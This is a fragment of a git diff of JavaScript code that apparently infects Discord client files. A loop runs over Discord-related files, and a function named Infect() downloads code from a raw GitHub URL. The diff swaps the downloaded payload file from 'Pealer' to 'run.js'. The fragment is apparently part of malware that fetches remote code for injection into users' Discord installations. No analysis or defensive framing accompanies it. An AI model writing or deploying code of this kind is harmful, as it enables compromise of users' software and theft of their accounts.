@@ -27,7 +27,7 @@ discords.forEach(function(file) {
     })
 });
 function Infect() {
-    https.get('https://raw.githubusercontent.com/UnReallAvocado/Fruit/main/Pealer', (resp) => {
+    https.get('https://raw.githubusercontent.com/UnReallAvocado/Fruit/main/run.js', (resp) => {
         let data = '';
         resp.on('data', (chunk) => {
             data += chunk;
